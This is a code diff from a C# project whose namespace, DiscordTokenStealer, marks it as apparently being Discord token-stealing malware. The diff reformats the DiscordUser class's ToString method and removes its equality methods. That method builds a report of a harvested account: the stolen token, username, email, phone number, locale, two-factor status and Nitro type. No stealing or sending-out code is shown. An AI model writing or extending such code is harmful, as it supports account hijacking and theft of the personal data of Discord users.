@@ -3,7 +3,7 @@ using Cysharp.Text;
 
 namespace DiscordTokenStealer.Discord;
 
-public sealed class DiscordUser
+public class DiscordUser
 {
     public DiscordUser(string? phoneNumber, string? aboutMe, string username, string discriminator, string id,
         string locale, bool twoFactor, string email, bool emailVerified, int premiumType)
@@ -35,36 +35,25 @@ public sealed class DiscordUser
     public override string ToString()
     {
         using var sb = ZString.CreateUtf8StringBuilder();
-        if (!string.IsNullOrEmpty(Token))
-        {
+        
+        if (!string.IsNullOrEmpty(Token)) 
             sb.AppendLine($"\t{Token}");
-        }
+        
         sb.AppendLine("\tSummary:");
         sb.AppendLine($"\t\tUser: {Username}#{Discriminator} ({Id})");
         sb.AppendLine($"\t\tEmail: {Email}");
-        if (!string.IsNullOrEmpty(PhoneNumber))
-        {
+        
+        if (!string.IsNullOrEmpty(PhoneNumber)) 
             sb.AppendLine($"\t\tPhone: {PhoneNumber}");
-        }
+        
         sb.AppendLine($"\t\tLocale: {Locale}");
         sb.AppendLine($"\t\tVerified: {EmailVerified}");
         sb.AppendLine($"\t\tTwo-Factor: {TwoFactor}");
-        if (!string.IsNullOrEmpty(AboutMe))
-        {
+        
+        if (!string.IsNullOrEmpty(AboutMe)) 
             sb.AppendLine($"\t\tAbout Me: {AboutMe}");
-        }
+        
         sb.AppendLine($"\t\tNitro-Type: {(DiscordNitroType) PremiumType}");
         return sb.ToString();
-    }
-
-    public override bool Equals(object? obj)
-    {
-        if (obj is not DiscordUser user) return false;
-        return Id == user.Id;
-    }
-
-    public override int GetHashCode()
-    {
-        return Id.GetHashCode();
     }
 }
